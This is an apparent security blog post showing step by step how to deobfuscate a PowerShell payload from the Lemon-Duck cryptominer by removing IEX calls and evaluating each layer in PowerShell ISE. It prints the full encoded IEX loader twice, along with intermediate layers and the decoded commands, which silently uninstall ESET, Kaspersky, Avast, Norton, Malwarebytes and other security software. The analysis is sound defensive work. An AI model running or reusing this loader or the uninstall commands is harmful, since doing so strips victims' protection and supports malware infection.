---
title:  "Lemon-Duck Powershell: An easy way to deobfuscate it!"
tags: Malware-Analysis
---

I came across a fileless malware called Lemon-Duck crypto miner during our (my officemate and I) investigation on suspicious communication in our client network. This malware completely leveraging the PowerShell module to execute most of their payloads.

PowerShell attacks are currently the popular weapon of alternative for several of those attacks as a result of it provides a variety of techniques for bypassing existing security. Not least of all, the flexibility to run directly in memory and remotely download payloads gave a lot of benefits to the attacker.

Here in this blog post, we will learn how to deobfuscate obfuscated scripts easily.

All we need is a text editor and PowerShell ISE. Windows PowerShell Integrated Scripting Environment (ISE) is used to create, run, and debug commands and scripts. I'll use VSCode for my text editor. 

![PowerShell ISE](https://i.stack.imgur.com/91RZH.png)

You may conduct this analysis in a safe malware analysis environment, as we might accidentally execute malware code without our concern.

The above figure shows the interface of Powershell ISE. You may run the ISE in administrator mode. As you can see, there are two parts to the ISE GUI. The white space will be our place to place our PowerShell code while the blue one is to interact and run our PowerShell code.

Before we proceed with the deobfuscation process, we need to have little understanding of what makes the script run and execute. So, in PowerShell, there is a cmdlet that is used to evaluates or runs a specified string as a command. This cmdlet is called `Invoke-Expression` or in short form `IEX`. This `IEX` can be deobfuscated to hide their presence in analyst first glance.

For example, the below command line use to download and execute the content of the `Payload.ps1` using `Invoke-Experession` PowerShell cmdlet.
```
Powershell -Invoke-Expression (("New-Object Net.WebClient")).('Payload.ps1’)
```

# Deobfuscation
Below the snippet code is the content of one of the payloads executed by the malware.
```
I`EX $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$('edbd07601c499625262f6dca7b7f4af54ad7e074a10880601324d8904010ecc188cde692ec1d69472329ab2a81ca6556655d661640cced9dbcf7de7befbdf7de7befbdf7ba3b9d4e27f7dfff3f5c6664016cf6ce4adac99e2180aac81f3f7e7c1f3f227eb7e7df7d903ffb2c4d3fbaf3f1effdf127dfbfb7fbbda745599ece9bdfed93efef7e6f5694cf4fbfddfc6ee9d638fd993b7b0fbf5f1f7f7bfabdef7ffea2a8dbd7df1bddd9bd2f9f7cf2a9f9657f67577edbda3a9d66e5cbbc1edff9f877fb78f4f1ce8b871fbb8f1edeeb82b22f7eb2677fbbb71b01f61b27bf7192de493ffee4e33bfbf7be4f3fea6c7ef2bdef5fbc38abdf00d0c307dfe74f3eb90738fcdbdeaefe66e0bc1adff9f4a17ce45e7c70a0cd774df34f76b491f7defcfc17dd3b98d3bf34fa3d6d47487cb26fbaddf13ef5dedba78f7bc81298879fd3a7e7f48b6bfaf01e7dd4c56ecfc07ff8a9fd5648d5479068cd083edcd776077644f7154cf8c2b3bb69d6b4afd2657b37cddbbccc6777d3e66d93b5f4dd27f4fff9b401d9a9d9ee40bb694358699bbdacd1f7d0d4fcda7f03cd7fe3e4edb42a279f2dabc27436cdd2fbf7763f6beb6aa59f94fa33a3a6e96ada7e5656d3aaadea55ba2c3eab8b59fae5c58a5eb95ee633faedb39c505964cb342fd7752aafd227bf6836cbd2b2ccaef2ba38b7bf5cd287f3a6cd97820ab533d8008dfd7d46a344c78a83f66f70eda1b1bfcf681020c284fed586f922a33f14a79b31b9779f3b6ea7f972594dd3dd31fff759d3e435bd6c3e7eb877fffea7dc7099b74d51a6fb9755bb7fc9f0afdf1162f82acda7d9799db7cb22cddfe563ee82e70a98d1ff7fe364f6fac553fde3b5c0c4209572bfe862592cf355c5a07cc40906006a2b819b4e6996dfd137f978b6986220bfc4eb279fd6d5b3dfe3f7f83dd2dd345f97d94f6ea74f5f7df9dda769beba7eb36dba23d26394ab4575929793ac299e82ac0d0d804858672fafbff3aece2febfcf5325b2cb3e7f467934f0b7c40bfb6f9ebb2aadb6545289cb4cbbcaed727d7df51c8efbe387df3faf741b3475f3cffbdbe4d50d3799bbddc4eaf5b08268db17ea94d17797bb64dc0527a7814f28b1dc9fd7495e765b3ddd659db4015a5f270db3bbf8440d3f08bc5d5eee5ef954eb78964f95cdfa5815c1121a7779951dbac5c2df237f9b2783ea3f1d0980fe9734c13bd4f88eedd234c2059d7cdf577e8c7bbe6aa9a19892aae3094290019e8d4844604bab5eb69feeef45044e1453e6f77e9b7cbdfeb136acd6f10315ffce2df336d30f465be585fd4c7db2034387f55d4d366b26e40d0aaaa4128e2a1558377b6d39a61ae9b65050a03eaa9877fda345979b24d2f2c8934cb39949b11c0b362f15d5075ebb33a17008777564692dad7294bdd715dd5f5e976fa4b40896f9f9e8300d7af7fffd75f120fbffcfdb3367b3a333cd7b6d982388abfd8bbb72cbe4bcdd3e3d767d4394685fecfdafc82b5ee9bf4f4d5e9b7bf9beeec7c7a2f7d71f6ed3767df4d09fd4bfaf214e2405d6746a68bf362868fbed0419cfdfebf7ffac597af9e61a2bf95be39397dae2d4f5f8394d775befe09fd04483fff89ef32852fb2f5c512526f9a5343fc264a61fd1368bb77b92830d1983821f56720f56b901ae8d10ceaf4c9dc9d0773673801f38751d2ff65169d2cc526d3bc35cd56afcd9cb625bd5c3ce33e69b8e12cd2c4d1b776eedab27826fddf8e710ceb4b5fa44f66cbe209b1807ece9c50bd01f6b9b101d483c5c2f1b687cf778d781ab1bb4393bf6a7e7a9c65f4cbe8dba7fa967c461f6d1126e50a1ec49dfb5b8443dd02d3f19a084badcff7bef2da50576836daf11b2a406dbfebb71f37ab05cd10bdf67b7de604df436e99bd224654c3a4d3e9be57c8bf71f28bef34c0c7dacc22c59f5bf36996d7d5b901a65f924ade2c32d4992f354c5e92187d9d05c770822f3f78edcc529ad036c2a38d5586a8198b111823358a00e8642c3f2c3c8edb03311219b2c2432d4418444ba00f2742f8f202024aaa1e72e60bcd80c4d04764a3266f696e26a1b8dc8e5d3d99d8201096013125bff8ce6e5b54339a2c2552da56cbedadf3025f7e6c9c008cee97fce2f9d4307936fd25f8fe4bc8eeca90f7f4dc204f9f4e6846187fe0c6089d6bb3ed94be8a0c0253c883c07407e3c0076e280a663b255fe2a7275f9e7d61669786f5f967bb06450c8a7ffd187afc523ffdbd78ccd75039ad38713c905ff263f837b08d3ff66332c2d5122c4f389e2f0de85dfdc96283f1c1a9f458665d5b4f515b2ab45dd3817eecfaf925f687fc04adc13a537c62bf92dfcad248f472bb5d570f3f3fbf431f2d217e76c27ed168271d994fdd2ffbe9e84e548b384aa93e01cd9dda09f5c98022d19ea14f7eaf1191e5e91727bfffeb97f4cb967e639a968bdf7b0cf2304ac624d28c9b0fb7e8e79b1a7ee10579f9753e331e6c0546a4063f6669f163bff8ce9da0ab665964e4459d8cadd08c89d7dcdc90738c1ece0b0be2175fd72dfdaa5d989ffc4d7a47ff6a445b01545b2c8bf3fc29e1aadfc938c84715d75b3f4527a9aa3fd3d11d526f851938bdf09650d211db965ef77776b7c045fac91be26ea645754e2f7c66a8e6204a27a0c6b961591084b514bdf5ac3594fe7c7c59376d0328044f3f14b01d36edf1a72535f9868e65520a1b66c53cbd127f118ea242a5afab156b0092108aafe8ef50a29cde3172b4f3695a2deeea87e9e99baf5e9c7d914e1bc46044a2a995acc6cd99cc55de94791ae2a9df035dead96117e0d443c879211e423e26048b0d559342d23b78614eed84678dd856e637674ee9a3f4b3943b53f2fe127c0199bbf84c90f8c518ce2fb923edb73e713a1661035ce9e2bbf49b7eda9e57afab7a5a7c4110a0771504778fbee9e35f7c672ffd45f9767aef7777b6aa3092c02848570ad182d8d5b7b4ad7eadaf505fe8cebacabfc8bcb513be65858b3994f54723fe81bef6e53be6d2e5d9a347dfbfceea3afb1ed1072f1b42aa77e1dc0ac7602c374e89776c2848ad136d3f9669dddba579a5af83a9ed3359c05c910e0cabc43b21f8dccf8dfca360eea68e9884034c8087869d50fd532db76fb2d972a879bed34195f52ad408beb0ea417483a71414aad18d0c694b02f713db0a9f6af43aa6cc004536d3d7a9cd83c0305348656cf4f655fe8226d47f979c5e0c74514dc70fd7f72693712bceaf7c52e76f7f30a6effd0f41cbfade0f7ec02db77ecfcf982578c877ee7cfabbdf59904c64afe0036c7df2e916f9756bf4ef3e8599dcdbdb1d8f1f3ca4e4d8787cffd34f1edc1f8f0ff6b7befffdef5162895275cba2fae9ed7459afdb5cfc4b9e8a5f7c674b44030a1e384d97eb7343deba6a33e38b92bd5a168bd93174cbf7f3b27a453ea87e5516eb272ab5e3325b155332a62fc7d76d5153b0fbfa7b5bd2ba39e394165e20824b0e8030874cb405fd3d3bebc320842c98efdb8fc1387e53851af4aa9f7d6febb34c26453ff88d13a2ef9db26649cb0eef88907f4b7e3089ee08b16b23bea3a7675f7d35be63677f3da37c84b8f264c5d7488888972eec505194b10dad363afde2f8c5ab5383c9578f2e973974837cfce6ab975f7c79c29f6903c2e7f72455c888fc1ef4ff4f2ea935fee648e9ae7ca1dfef7d25bad07dc2ee8afbf3eedd47abb69df31f460d7d26a3fe25bfe497dc99d04fc3183ce8ad77f977ab9f22a067bfd84ed29d3bdfdf7d402cb5f3bd19373724f5d849fca6d7fb9fe64df66451195e794693dad6c6221befd4444fd594d2a62499c52511128da85be54611b9aa5d5dd727bbc7df7e3dbe36199455565f207bc45fd14f4cb47e45f3adbf91e38f39704a4684736b34e1d9a668ebfabca02cd5b8164543690efce292580ac74b712ecec6083ba9d9a145d9c7f2f8f52b4292b1e3bfc7f0be95073dfdf0197a3cdcdd79b733dac13ff8ed3362fa65b57a773a061686153fdbd9cdbe3d7bfe2545c8869c0f5e7dfafb9ce5e7bb3fbd7b39fd89af56cff7eefea09cfcf4eae4f9d39f9edc3ff862e7e4feef53ae7fd177df2e4fbeca5f3c9fef9fe7bf08a2bcffea07ef96f7a6c7af7fea607af5f6d54ebd738f5cc6e793f5f3d5c1eec1f362faf4bb3baf7e9fbb6fa0b0f7ea7bbfd78345f9eddfe76c5ab43f78f383cbbd172fee7d71f5f0ecd9cb9fde7f5b7ff77cefd39f6cbf3d59bf582edebcb877975eb93cb8bc982d56bff793ddcf2f7feff583ddeabb8b3d67c7a1c48437f423cb22c21bf22981f945f9a5c7179f35fafbda38c5246daeed1742a9c6b2964e9b4c02b5f0e7c134e9cf0503f9fe94fe1d8fef3dd865f6fe0c2cf28befd09f690b0f663bc5f70a03f102710bb4ee74ccada792b63bbc73676bb6ccabd6389a19471477b616f44bdbe4e459537aae267530be63e304ff43564362234197265fffa2bc9ee45763e3cf62d8cbefc19065f92b1874007e0dc58854f699c254d543a333c4dcda6af2f67a62dde28bf1c1796b222bea0ad91e02504d97f9d8a8b67779fb3dfd95befa6cc614114529ee3f990670a86455d4d051cbd3f3d9ec8b2faee9f9fde5cf541280dbb0fe4fc56891d9803efb3de8e767f48b76c3302030f0c5c9d559926f92bfab2617cd02c9666db532c2b826f78284a60477379476b864ff1669d99d9d1d8a8d966bb2fb799d5d95d917db64538e390b4d6490cfe8ad2f9c5bb9fb4b1d85c136f54b581bcadc9ec0c491974419236dcaeec025e21fc779a4ff96ec10b5dcb19988d2ad89003722d7efae1f18cb44a424fdf2e277ff3632026f6971807878892e73027ea549408ae4606756bc3480c4553aa1a173565b30f351eae282dfb477edfbfc776fd675f19320894187baff18993b8bc1c758195124a47743fe5b224100627828142586a1c2d0f0b9677de5c3877ffebb43295c66bfbbd34c839d767a335c39dc21b5409f0ab9df75db64e8d9756938e3869ebd6ef50de95dfff091d08f86066f59ef2da9cc5593fd5ebffb00d9c1093773dcc7589db24450d89b88dfe6cde9c689ee756748647b9d439571a6e2f7c677dfdfb9f7bdd3c597df6e5ed25a2aad84ef7deff48b2fe7aff157ba958ed38fb768c9fc301d6fa5bfdb65fe6a5235f9cbfaf49cb2a42f4ef2f19b2f5fb7f5d9f262ebcef77647f7beff09adac6fff7475b6fcf8e33bd4c7e779bb7d79fcea2c9b3c3f4dd3f2ea414e99dd3be3cbacfc2affde36f941db5be9e656e3325f7efe669edef9fef64f7f59bc20b0bf71f2ff00'-split'(..)'|?{$_}|%{[convert]::ToUInt32($_,16)}))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();
```

As you read the content, it has an `IEX` cmdlet at the beginning of the code.

## First step
Using your text editor, Identify the `IEX` cmdlet and remove it from the code. Thus make your code looks like below:
```
$(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$('edbd07601 ....
```

## Second step
Add variable and equal sign in front of the code. Give any variable name you wanted. In my case, I'll be using `$decoded` as my variable. Our objective in doing this is to make the decoded value stores in our `$decoded` variable so that then we can view the decoded value.

Our code will look like below:
```
$decoded = $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$('edbd07601 ....
```

## Third step
Copy the full code into the ISE editor.

![1](https://user-images.githubusercontent.com/56353946/133936069-fc32a8fa-74ca-422c-a6cd-6afe467185e1.png)

## Forth step
After copy the code, run the code by click the "Green Play" icon above the tab. This will make our code run and store the decoded value in variable `$decoded`.

![2](https://user-images.githubusercontent.com/56353946/133936077-1681276c-4451-4660-9e5a-a48b1f0fd92e.png)

As you can see in blue PowerShell, the code is executed. 

## Fifth step
Print the value stored in the `$decoded` variable into a text file, so that we can view it in our text editor. You might want to change your directory first.
```
cd C:\Users\<user name>\Desktop
echo $decoded > decoded_1.txt
```
Because the malware encodes the script multiple times, so I name my decoded text file with the number at the back to indicate my phase in deobfuscate the code.

![3](https://user-images.githubusercontent.com/56353946/133936094-05a11cf8-76cf-4c2d-9d4f-d5f23ecf8f70.png)

## Sixth step
Open the decoded file and repeat steps 1 until 5. 

The figure below shows the comparison between the original code and decoded version. The problem here, the author of the malware encodes the script multiple times using different techniques.

![4](https://user-images.githubusercontent.com/56353946/133936099-c76b7b69-d6f6-4c9c-93dc-5e0e9f6fb8a3.png)

## Repeat
Using this technique, we don't need to manually decode the `Char`, reverse char, and many more obfuscation techniques in a manual way. From now, repeat steps 1 until 5. Let's follow along.

Identify the `IEX` and remove it first:
![5](https://user-images.githubusercontent.com/56353946/133936102-c33ae98d-bbd2-4002-b8ef-baf6deea3495.png)

If you don't know what the line does, just run the line in PowerShell like below. Figure below shows that `.( $veRbosePrEfERENCe.TOStrIng()[1,3]+'X'-joIn'')` is actually Invoke-Expression cmdlet.

![6](https://user-images.githubusercontent.com/56353946/133936105-22667fd2-f73c-4b45-beb7-538353fbcfe8.png)

If we look into this code, this code stores these long strings (the code) into the variable `$LW7eF`.
```
$LW7eF=  ")'X'+]31[DillEhs$+]1[dilLEHs$ (. |)29]rAHc[]GNirtS[,)15]rAHc[+65]rAHc[+401]rAHc[((EcalPer.)'$','0N9'(EcalPer.)93]rAHc[]GNirtS[,)401]rAHc[+201]rAHc[+311]rAHc[((EcalPer.)'
<--- snippet --->
ehfq+hfqvitcaretnionhfq+hfq/ llatsninu llac OgpHEf%%hfq+hfqyksrepsaK%%HEf ekil emanOgp erehw'+' tcudorp exe.cimw b/ trats c/ dmc
'+'
evitcarethfq+hfqnion/ llatsninu llac OgpHEf%tesE%HEf ekil emanOgp erehw tcudorp exe.cimw b/ trhfq+hfqats c/ dmchfq(( )hfqXhfq+]03[EmOHsP0N9+]12[EMOhSP0N9 ( . '(  "; .( $veRbosePrEfERENCe.TOStrIng()[1,3]+'X'-joIn'')(( Get-vARIabLE  lw7ef  ).valUe[-1..-( ( Get-vARIabLE  lw7ef  ).valUe.lenGTh )]-jOiN'')
```
At the final line, the value will be decoded with the line `(( Get-vARIabLE  lw7ef  ).valUe[-1..-( ( Get-vARIabLE  lw7ef  ).valUe.lenGTh )]-jOiN'')` and being execute using `IEX` represent in obfuscated way `.( $veRbosePrEfERENCe.TOStrIng()[1,3]+'X'-joIn'')`.

So we've done removing the IEX.

Next, copy the whole code but without `(( Get-vARIabLE  lw7ef  ).valUe[-1..-( ( Get-vARIabLE  lw7ef  ).valUe.lenGTh )]-jOiN'')` line and execute it. We will execute this line seperately.

![7](https://user-images.githubusercontent.com/56353946/133936115-4672ff38-eb64-43cc-be8c-db7080487d48.png)

Then run the above line `(( Get-vARIabLE  lw7ef  ).valUe[-1..-( ( Get-vARIabLE  lw7ef  ).valUe.lenGTh )]-jOiN'')` but with the variable `$decoded` and equal sign at the front like in the below figure. Then, print the value into a text file.

![8](https://user-images.githubusercontent.com/56353946/133936142-2ac27262-3eeb-4023-9d29-9b28d64c5eaa.png)

![9](https://user-images.githubusercontent.com/56353946/133936146-fd3141f6-baae-4745-b8e7-ccb7ba56497c.png)

On the right side. Our code becomes more readable than before (left side). All we need to continue to deobfuscate the code again.

Identify and remove `IEX`

![10](https://user-images.githubusercontent.com/56353946/133936152-19268450-46c0-4b5b-bdca-6a748c537e17.png)

Append our variable in front of the code.
```
$decoded =  (' . ( 9N0PShOME[21]+9N0PsHOmE[30]+qfhXqfh) ((qfhcmd /c staqfh+qfhrt /b wmic.exe product where pgOname like fEH%Eset%fEHpgO call uninstall /noinqfh+qfhteractive
'+'
cmd /c start /b wmic.exe product '+'where pgOname like fEH%%Kasperskyqfh+qfh%%fEHpgO call uninstall /qfh+qfhnointeractivqfh+qfhe

<--- snippet --->

schqfh+qfhtasks /delete /tn Rtsa /Fqfh).RePlacE(([Char]75+[Char]118+[Char]49),qfh9N0qfh).RePlacE(([Char]102+[Char]'+'69+[Char]72),[STrINg][Char]'+'39).RePlacE(qfhf'+'G9qfh,[STrINg][Char'+']124).RePlacE(('+'[Char]120+[Char]74+'+'[Char]121),qfhh83qfh).RePlacE(([Char]90+[Char]111+[Char]87),[STrINg][Char]96).RePlacE(([Char]112+[Char]103+[Char]79),[STrINg][Char'+']34)'+' ) 
').rePlacE(([cHAr]113+[cHAr]102+[cHAr]104),[StriNG][cHAr]39).rePlacE('9N0','$').rePlacE(([cHAr]104+[cHAr]56+[cHAr]51),[StriNG][cHAr]92)
```

Copy the whole code and execute it in PowerShell ISE. Print value of variable decoded into another text file.

![11](https://user-images.githubusercontent.com/56353946/133936153-1de7bf84-adf1-4fdd-99e9-25bd1136dd3e.png)

![12](https://user-images.githubusercontent.com/56353946/133936156-d8f0953a-4ae8-4138-bb51-7392e728239d.png)

Based on the result, still we can see that the code is not fully deobfuscated. Repeat the steps until we get the clean version of the code.

Below is the final deobfuscation of the code, and the script has now become clean and readable.

![13](https://user-images.githubusercontent.com/56353946/133936159-cd1972c4-8e57-4180-88d0-ce883161cadb.png)

# Final result
Original obfuscate code
```
I`EX $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$('edbd07601c499625262f6dca7b7f4af54ad7e074a10880601324d8904010ecc188cde692ec1d69472329ab2a81ca6556655d661640cced9dbcf7de7befbdf7de7befbdf7ba3b9d4e27f7dfff3f5c6664016cf6ce4adac99e2180aac81f3f7e7c1f3f227eb7e7df7d903ffb2c4d3fbaf3f1effdf127dfbfb7fbbda745599ece9bdfed93efef7e6f5694cf4fbfddfc6ee9d638fd993b7b0fbf5f1f7f7bfabdef7ffea2a8dbd7df1bddd9bd2f9f7cf2a9f9657f67577edbda3a9d66e5cbbc1edff9f877fb78f4f1ce8b871fbb8f1edeeb82b22f7eb2677fbbb71b01f61b27bf7192de493ffee4e33bfbf7be4f3fea6c7ef2bdef5fbc38abdf00d0c307dfe74f3eb90738fcdbdeaefe66e0bc1adff9f4a17ce45e7c70a0cd774df34f76b491f7defcfc17dd3b98d3bf34fa3d6d47487cb26fbaddf13ef5dedba78f7bc81298879fd3a7e7f48b6bfaf01e7dd4c56ecfc07ff8a9fd5648d5479068cd083edcd776077644f7154cf8c2b3bb69d6b4afd2657b37cddbbccc6777d3e66d93b5f4dd27f4fff9b401d9a9d9ee40bb694358699bbdacd1f7d0d4fcda7f03cd7fe3e4edb42a279f2dabc27436cdd2fbf7763f6beb6aa59f94fa33a3a6e96ada7e5656d3aaadea55ba2c3eab8b59fae5c58a5eb95ee633faedb39c505964cb342fd7752aafd227bf6836cbd2b2ccaef2ba38b7bf5cd287f3a6cd97820ab533d8008dfd7d46a344c78a83f66f70eda1b1bfcf681020c284fed586f922a33f14a79b31b9779f3b6ea7f972594dd3dd31fff759d3e435bd6c3e7eb877fffea7dc7099b74d51a6fb9755bb7fc9f0afdf1162f82acda7d9799db7cb22cddfe563ee82e70a98d1ff7fe364f6fac553fde3b5c0c4209572bfe862592cf355c5a07cc40906006a2b819b4e6996dfd137f978b6986220bfc4eb279fd6d5b3dfe3f7f83dd2dd345f97d94f6ea74f5f7df9dda769beba7eb36dba23d26394ab4575929793ac299e82ac0d0d804858672fafbff3aece2febfcf5325b2cb3e7f467934f0b7c40bfb6f9ebb2aadb6545289cb4cbbcaed727d7df51c8efbe387df3faf741b3475f3cffbdbe4d50d3799bbddc4eaf5b08268db17ea94d17797bb64dc0527a7814f28b1dc9fd7495e765b3ddd659db4015a5f270db3bbf8440d3f08bc5d5eee5ef954eb78964f95cdfa5815c1121a7779951dbac5c2df237f9b2783ea3f1d0980fe9734c13bd4f88eedd234c2059d7cdf577e8c7bbe6aa9a19892aae3094290019e8d4844604bab5eb69feeef45044e1453e6f77e9b7cbdfeb136acd6f10315ffce2df336d30f465be585fd4c7db2034387f55d4d366b26e40d0aaaa4128e2a1558377b6d39a61ae9b65050a03eaa9877fda345979b24d2f2c8934cb39949b11c0b362f15d5075ebb33a17008777564692dad7294bdd715dd5f5e976fa4b40896f9f9e8300d7af7fffd75f120fbffcfdb3367b3a333cd7b6d982388abfd8bbb72cbe4bcdd3e3d767d4394685fecfdafc82b5ee9bf4f4d5e9b7bf9beeec7c7a2f7d71f6ed3767df4d09fd4bfaf214e2405d6746a68bf362868fbed0419cfdfebf7ffac597af9e61a2bf95be39397dae2d4f5f8394d775befe09fd04483fff89ef32852fb2f5c512526f9a5343fc264a61fd1368bb77b92830d1983821f56720f56b901ae8d10ceaf4c9dc9d0773673801f38751d2ff65169d2cc526d3bc35cd56afcd9cb625bd5c3ce33e69b8e12cd2c4d1b776eedab27826fddf8e710ceb4b5fa44f66cbe209b1807ece9c50bd01f6b9b101d483c5c2f1b687cf778d781ab1bb4393bf6a7e7a9c65f4cbe8dba7fa967c461f6d1126e50a1ec49dfb5b8443dd02d3f19a084badcff7bef2da50576836daf11b2a406dbfebb71f37ab05cd10bdf67b7de604df436e99bd224654c3a4d3e9be57c8bf71f28bef34c0c7dacc22c59f5bf36996d7d5b901a65f924ade2c32d4992f354c5e92187d9d05c770822f3f78edcc529ad036c2a38d5586a8198b111823358a00e8642c3f2c3c8edb03311219b2c2432d4418444ba00f2742f8f202024aaa1e72e60bcd80c4d04764a3266f696e26a1b8dc8e5d3d99d8201096013125bff8ce6e5b54339a2c2552da56cbedadf3025f7e6c9c008cee97fce2f9d4307936fd25f8fe4bc8eeca90f7f4dc204f9f4e6846187fe0c6089d6bb3ed94be8a0c0253c883c07407e3c0076e280a663b255fe2a7275f9e7d61669786f5f967bb06450c8a7ffd187afc523ffdbd78ccd75039ad38713c905ff263f837b08d3ff66332c2d5122c4f389e2f0de85dfdc96283f1c1a9f458665d5b4f515b2ab45dd3817eecfaf925f687fc04adc13a537c62bf92dfcad248f472bb5d570f3f3fbf431f2d217e76c27ed168271d994fdd2ffbe9e84e548b384aa93e01cd9dda09f5c98022d19ea14f7eaf1191e5e91727bfffeb97f4cb967e639a968bdf7b0cf2304ac624d28c9b0fb7e8e79b1a7ee10579f9753e331e6c0546a4063f6669f163bff8ce9da0ab665964e4459d8cadd08c89d7dcdc90738c1ece0b0be2175fd72dfdaa5d989ffc4d7a47ff6a445b01545b2c8bf3fc29e1aadfc938c84715d75b3f4527a9aa3fd3d11d526f851938bdf09650d211db965ef77776b7c045fac91be26ea645754e2f7c66a8e6204a27a0c6b961591084b514bdf5ac3594fe7c7c59376d0328044f3f14b01d36edf1a72535f9868e65520a1b66c53cbd127f118ea242a5afab156b0092108aafe8ef50a29cde3172b4f3695a2deeea87e9e99baf5e9c7d914e1bc46044a2a995acc6cd99cc55de94791ae2a9df035dead96117e0d443c879211e423e26048b0d559342d23b78614eed84678dd856e637674ee9a3f4b3943b53f2fe127c0199bbf84c90f8c518ce2fb923edb73e713a1661035ce9e2bbf49b7eda9e57afab7a5a7c4110a0771504778fbee9e35f7c672ffd45f9767aef7777b6aa3092c02848570ad182d8d5b7b4ad7eadaf505fe8cebacabfc8bcb513be65858b3994f54723fe81bef6e53be6d2e5d9a347dfbfceea3afb1ed1072f1b42aa77e1dc0ac7602c374e89776c2848ad136d3f9669dddba579a5af83a9ed3359c05c910e0cabc43b21f8dccf8dfca360eea68e9884034c8087869d50fd532db76fb2d972a879bed34195f52ad408beb0ea417483a71414aad18d0c694b02f713db0a9f6af43aa6cc004536d3d7a9cd83c0305348656cf4f655fe8226d47f979c5e0c74514dc70fd7f72693712bceaf7c52e76f7f30a6effd0f41cbfade0f7ec02db77ecfcf982578c877ee7cfabbdf59904c64afe0036c7df2e916f9756bf4ef3e8599dcdbdb1d8f1f3ca4e4d8787cffd34f1edc1f8f0ff6b7befffdef5162895275cba2fae9ed7459afdb5cfc4b9e8a5f7c674b44030a1e384d97eb7343deba6a33e38b92bd5a168bd93174cbf7f3b27a453ea87e5516eb272ab5e3325b155332a62fc7d76d5153b0fbfa7b5bd2ba39e394165e20824b0e8030874cb405fd3d3bebc320842c98efdb8fc1387e53851af4aa9f7d6febb34c26453ff88d13a2ef9db26649cb0eef88907f4b7e3089ee08b16b23bea3a7675f7d35be63677f3da37c84b8f264c5d7488888972eec505194b10dad363afde2f8c5ab5383c9578f2e973974837cfce6ab975f7c79c29f6903c2e7f72455c888fc1ef4ff4f2ea935fee648e9ae7ca1dfef7d25bad07dc2ee8afbf3eedd47abb69df31f460d7d26a3fe25bfe497dc99d04fc3183ce8ad77f977ab9f22a067bfd84ed29d3bdfdf7d402cb5f3bd19373724f5d849fca6d7fb9fe64df66451195e794693dad6c6221befd4444fd594d2a62499c52511128da85be54611b9aa5d5dd727bbc7df7e3dbe36199455565f207bc45fd14f4cb47e45f3adbf91e38f39704a4684736b34e1d9a668ebfabca02cd5b8164543690efce292580ac74b712ecec6083ba9d9a145d9c7f2f8f52b4292b1e3bfc7f0be95073dfdf0197a3cdcdd79b733dac13ff8ed3362fa65b57a773a061686153fdbd9cdbe3d7bfe2545c8869c0f5e7dfafb9ce5e7bb3fbd7b39fd89af56cff7eefea09cfcf4eae4f9d39f9edc3ff862e7e4feef53ae7fd177df2e4fbeca5f3c9fef9fe7bf08a2bcffea07ef96f7a6c7af7fea607af5f6d54ebd738f5cc6e793f5f3d5c1eec1f362faf4bb3baf7e9fbb6fa0b0f7ea7bbfd78345f9eddfe76c5ab43f78f383cbbd172fee7d71f5f0ecd9cb9fde7f5b7ff77cefd39f6cbf3d59bf582edebcb877975eb93cb8bc982d56bff793ddcf2f7feff583ddeabb8b3d67c7a1c48437f423cb22c21bf22981f945f9a5c7179f35fafbda38c5246daeed1742a9c6b2964e9b4c02b5f0e7c134e9cf0503f9fe94fe1d8fef3dd865f6fe0c2cf28befd09f690b0f663bc5f70a03f102710bb4ee74ccada792b63bbc73676bb6ccabd6389a19471477b616f44bdbe4e459537aae267530be63e304ff43564362234197265fffa2bc9ee45763e3cf62d8cbefc19065f92b1874007e0dc58854f699c254d543a333c4dcda6af2f67a62dde28bf1c1796b222bea0ad91e02504d97f9d8a8b67779fb3dfd95befa6cc614114529ee3f990670a86455d4d051cbd3f3d9ec8b2faee9f9fde5cf541280dbb0fe4fc56891d9803efb3de8e767f48b76c3302030f0c5c9d559926f92bfab2617cd02c9666db532c2b826f78284a60477379476b864ff1669d99d9d1d8a8d966bb2fb799d5d95d917db64538e390b4d6490cfe8ad2f9c5bb9fb4b1d85c136f54b581bcadc9ec0c491974419236dcaeec025e21fc779a4ff96ec10b5dcb19988d2ad89003722d7efae1f18cb44a424fdf2e277ff3632026f6971807878892e73027ea549408ae4606756bc3480c4553aa1a173565b30f351eae282dfb477edfbfc776fd675f19320894187baff18993b8bc1c758195124a47743fe5b224100627828142586a1c2d0f0b9677de5c3877ffebb43295c66bfbbd34c839d767a335c39dc21b5409f0ab9df75db64e8d9756938e3869ebd6ef50de95dfff091d08f86066f59ef2da9cc5593fd5ebffb00d9c1093773dcc7589db24450d89b88dfe6cde9c689ee756748647b9d439571a6e2f7c677dfdfb9f7bdd3c597df6e5ed25a2aad84ef7deff48b2fe7aff157ba958ed38fb768c9fc301d6fa5bfdb65fe6a5235f9cbfaf49cb2a42f4ef2f19b2f5fb7f5d9f262ebcef77647f7beff09adac6fff7475b6fcf8e33bd4c7e779bb7d79fcea2c9b3c3f4dd3f2ea414e99dd3be3cbacfc2affde36f941db5be9e656e3325f7efe669edef9fef64f7f59bc20b0bf71f2ff00'-split'(..)'|?{$_}|%{[convert]::ToUInt32($_,16)}))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();
```

Deobfuscated code
```
cmd /c start /b wmic.exe product where "name like '%Eset%'" call uninstall /nointeractivecmd /c start /b wmic.exe product where "name like '%%Kaspersky%%'" call uninstall /nointeractive
cmd /c start /b wmic.exe product where "name like '%avast%'" call uninstall /nointeractive
cmd /c start /b wmic.exe product where "name like '%avp%'" call uninstall /nointeractive
cmd /c start /b wmic.exe product where "name like '%Security%'" call uninstall /nointeractive
cmd /c start /b wmic.exe product where "name like '%AntiVirus%'" call uninstall /nointeractive
cmd /c start /b wmic.exe product where "name like '%Norton Security%'" call uninstall /nointeractive
cmd /c "C:\Progra~1\Malwarebytes\Anti-Malware\unins000.exe" /verysilent /suppressmsgboxes /norestart
$v="?$v"+(Get-Date -Format '_yyyyMMdd')
